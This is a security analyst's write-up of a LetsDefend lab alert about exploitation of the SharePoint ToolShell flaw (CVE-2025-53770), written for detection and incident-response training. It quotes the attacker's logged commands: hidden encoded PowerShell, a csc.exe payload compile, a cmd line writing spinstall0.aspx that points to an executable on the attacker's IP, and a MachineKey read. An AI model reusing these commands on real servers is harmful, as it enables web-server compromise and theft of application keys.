# SOC342 - CVE-2025-53770 SharePoint ToolShell Authentication Bypass and Remote Code Execution

**Platform:** LetsDefend  
**Role:** Security Analyst  
**Alert Type:** Web Attack  
**Difficulty:** Hard  
**Event Time:** 2025-07-22 13:07:10 +03:00  
**Rule:** SOC342 - CVE-2025-53770 SharePoint ToolShell Auth Bypass and RCE  
**Hostname:** SharePoint01  
**Destination IP:** 172.16.20.17  
**Source IP:** 107.191.58.76  
**Device Action:** Allowed  
**HTTP Method:** POST  
**User-Agent:** Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0  
**Referer:** `/_layouts/SignOut.aspx`  
**Requested URL:** `/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx`  
**Content-Length:** 7699  

**Final Classification:** True Positive (TP)

---

## 1. Alert Overview

The SOC342 alert detected a suspicious unauthenticated POST request targeting the SharePoint ToolPane.aspx endpoint.

The request contained a large payload and a spoofed referer, characteristics associated with exploitation of CVE-2025-53770, also known as the SharePoint ToolShell vulnerability.

The alert indicated that an external source attempted to exploit the SharePoint server through the ToolPane endpoint.

### Investigation Objectives

1. Verify whether the reported web attack existed in the available logs.
2. Validate the source IP, destination IP, requested URL, HTTP method, and timestamp.
3. Investigate whether the request resulted in command execution on the SharePoint server.
4. Correlate endpoint terminal history with the alert timeline.
5. Identify the commands executed and determine their purpose.
6. Establish whether the attacker performed post-exploitation activity.

## 2. Initial Log Investigation: Verifying the Alert

### How I investigated it

I first searched for a log corresponding to the reported incident.

The objective was to establish whether the security alert represented an actual event in the environment rather than relying only on the alert description.

I located a log that correlated with the incident and compared its details against the information provided in the alert.

### Evidence

| Field | Alert Details |
|---|---|
| Source IP | 107.191.58.76 |
| Destination IP | 172.16.20.17 |
| HTTP Method | POST |
| Requested URL | `/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx` |
| Referer | `/_layouts/SignOut.aspx` |
| Content-Length | 7699 |
| Hostname | SharePoint01 |
| Device Action | Allowed |

### Observation

The log contained the reported suspicious request and its details corresponded with the alert information.

### Interpretation

This verified that the reported web request existed and that the alert was associated with actual activity against the SharePoint server.

However, a single web request was not sufficient to establish whether exploitation had succeeded.

I therefore moved to the endpoint security panel to investigate the server's activity around the incident time.

## 3. Endpoint Investigation: Correlating Terminal History

### How I investigated it

I opened the endpoint security panel and searched for the affected device:

`SharePoint01`

I then reviewed its terminal history and examined commands executed around the time of the reported web attack.

The objective was to determine whether the suspicious POST request was followed by command execution on the SharePoint server.

The terminal history showed a sequence of commands beginning shortly after the alert.

### 3.1 PowerShell Execution with an Encoded Command

**Timestamp:** July 22, 2025 - 13:07:24

**Process:**

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

**Command:**

```powershell
powershell.exe -nop -w hidden -e [Base64 encoded content]
```

The original command contained a Base64-encoded payload.

The command-line arguments included:

| Argument | Meaning |
|---|---|
| `-nop` | Prevents loading the PowerShell profile |
| `-w hidden` | Runs the PowerShell window in hidden mode |
| `-e` | Executes a Base64-encoded PowerShell command |

### Observation

PowerShell was launched in hidden mode with an encoded command shortly after the suspicious SharePoint request.

### Interpretation

The use of an encoded command and hidden execution is suspicious, particularly in the context of an unauthenticated web attack.

The decoded content contains ASP.NET code that accesses the SharePoint application's machine-key configuration through reflection.

It attempts to retrieve and return:

- ValidationKey
- DecryptionKey
- CompatibilityMode

These values are security-sensitive because they are used by ASP.NET to validate and protect application data.

This indicates an attempt to access sensitive SharePoint application configuration.

## 4. Payload Compilation

**Timestamp:** July 22, 2025 - 13:07:27

**Process:**

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```

**Command:**

```cmd
csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
```

### Observation

The Microsoft C# compiler (`csc.exe`) was executed to compile:

```text
C:\Windows\Temp\payload.cs
```

The output executable was specified as:

```text
C:\Windows\Temp\payload.exe
```

### Interpretation

This indicates that source code was compiled into an executable on the SharePoint server.

The use of the system compiler in this suspicious sequence is consistent with an attacker preparing a payload for further execution.

The command confirms compilation was requested. Successful execution of the resulting executable would require separate verification.

## 5. ASPX File Creation in the SharePoint Web Directory

**Timestamp:** July 22, 2025 - 13:07:29

**Process:**

```text
C:\Windows\System32\cmd.exe
```

**Command:**

```cmd
cmd.exe /c echo <form runat="server"> <object classid="clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11"> <param name="Command" value="Redirect"> <param name="Button" value="Test"> <param name="Url" value="http://107.191.58.76/payload.exe"></object></form> > "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx"
```

### Observation

The command used `cmd.exe` to write an ASPX file named:

```text
spinstall0.aspx
```

The destination was:

```text
C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\
```

The written ASPX content included a redirect to:

```text
http://107.191.58.76/payload.exe
```

### Interpretation

This is a significant finding.

The command created an ASPX page inside the SharePoint web application directory and embedded a reference to an executable hosted at the attacker's source IP.

This is consistent with malicious web-server-side file placement and an attempt to make the payload accessible through the SharePoint application.

The file creation demonstrates that the activity progressed beyond the initial web request into endpoint-level actions.

The actual retrieval or execution of `payload.exe` is not established by this command alone.

## 6. Additional PowerShell Execution: Accessing Machine-Key Configuration

**Timestamp:** July 22, 2025 - 13:07:34

**Process:**

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

**Command:**

```powershell
powershell.exe -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"
```

### Observation

PowerShell executed a command that accessed the ASP.NET MachineKey configuration.

This follows the earlier encoded PowerShell command containing code designed to retrieve the validation and decryption keys.

### Interpretation

This further supports the conclusion that the activity was intended to access sensitive SharePoint application configuration.

The command sequence is not consistent with ordinary SharePoint administration in the context of the suspicious external request and preceding payload activity.

## 7. Correlated Attack Timeline

The endpoint terminal history provided additional evidence that the suspicious web request was followed by commands associated with exploitation and post-exploitation activity.

| Timestamp | Activity | Significance |
|---|---|---|
| 13:07:10 | Suspicious POST request to ToolPane.aspx | Initial web attack detected |
| 13:07:24 | Hidden PowerShell execution with encoded content | Suspicious command execution |
| 13:07:27 | C# compiler invoked to create payload.exe | Payload compilation |
| 13:07:29 | ASPX file written into SharePoint LAYOUTS directory | Suspicious server-side file placement |
| 13:07:34 | PowerShell accesses MachineKey configuration | Attempt to access sensitive application configuration |

### Timeline Interpretation

The sequence shows a clear progression:

1. A suspicious request targeted the SharePoint ToolPane endpoint.
2. PowerShell executed shortly afterward using hidden and encoded execution.
3. The .NET compiler was invoked to generate an executable.
4. A new ASPX file was written into the SharePoint web directory.
5. PowerShell accessed the application's MachineKey configuration.

The close timing and nature of these commands strongly correlate with the original web attack.

## 8. Evidence Summary

| Investigation Stage | Evidence | Finding |
|---|---|---|
| Web request investigation | POST to ToolPane.aspx | Suspicious request verified |
| Source validation | 107.191.58.76 | Source IP matched the alert |
| Destination validation | 172.16.20.17 | Target server matched the alert |
| Endpoint investigation | SharePoint01 terminal history | Follow-on commands identified |
| PowerShell execution | Hidden Base64-encoded command | Suspicious command execution |
| Payload compilation | csc.exe compiling payload.cs | Executable compilation requested |
| ASPX file creation | spinstall0.aspx | File written into SharePoint web directory |
| MachineKey access | PowerShell MachineKey command | Sensitive application configuration targeted |

## 9. MITRE ATT&CK Mapping

The alert provided several MITRE ATT&CK techniques. The following are particularly relevant to the observed evidence.

| Technique | Name | Investigation Evidence |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Suspicious request targeting SharePoint ToolPane.aspx |
| T1059.003 | Windows Command Shell | cmd.exe used to create the ASPX file |
| T1059.001 | PowerShell | Hidden and encoded PowerShell execution |
| T1204.002 | Malicious File | Not independently established by the collected evidence |
| T1505.003 | Web Shell | ASPX file placement is suspicious, but web-shell functionality is not established |
| T1078 | Valid Accounts | Not independently established by the collected evidence |

The alert-provided techniques should not automatically be treated as confirmed. The mappings above distinguish observed behavior from techniques that still need additional evidence.

## 10. Final Assessment

<badge color="success">True Positive</badge>

**Classification: True Positive (TP)**

The investigation confirmed that the alert detected genuine malicious activity targeting the SharePoint server.

The initial suspicious POST request to the ToolPane.aspx endpoint was verified through the available logs. The endpoint security investigation then revealed a sequence of commands executed shortly after the request.

The strongest evidence includes:

1. Hidden PowerShell execution with a Base64-encoded command.
2. ASP.NET code attempting to access sensitive MachineKey configuration.
3. Use of the C# compiler to generate an executable.
4. Creation of an ASPX file inside the SharePoint web directory.
5. A reference to an executable hosted at the attacker's source IP.
6. Further PowerShell activity accessing MachineKey configuration.

These findings demonstrate that the incident progressed beyond a suspicious HTTP request into malicious command execution and server-side file creation.

**Investigation conclusion:** The alert is a True Positive. The activity is consistent with exploitation of the SharePoint ToolShell vulnerability, followed by post-exploitation actions on the affected server.

**Impact assessment:** Command execution and suspicious ASPX file creation are confirmed by the endpoint history. However, successful execution of the compiled payload, retrieval of the remote executable, and the full extent of compromise have not been independently established.

### Recommended Response

- Isolate the affected SharePoint server if compromise is ongoing.
- Preserve web-server, endpoint, and process telemetry.
- Investigate and safely contain `spinstall0.aspx`.
- Investigate `payload.cs` and `payload.exe`.
- Review outbound connections to `107.191.58.76`.
- Assess exposure of SharePoint MachineKey values and rotate affected secrets following incident-response procedures.
- Patch SharePoint against the exploited vulnerability and verify the installed security updates.
- Hunt for additional suspicious ASPX files, web shells, and related activity across other SharePoint servers.

---

**Investigation Status: Completed**

**Final Classification: True Positive (TP)**

**Key Finding:** A suspicious unauthenticated SharePoint request was followed by hidden PowerShell execution, payload compilation, ASPX file creation in the SharePoint web directory, and attempts to access sensitive application configuration.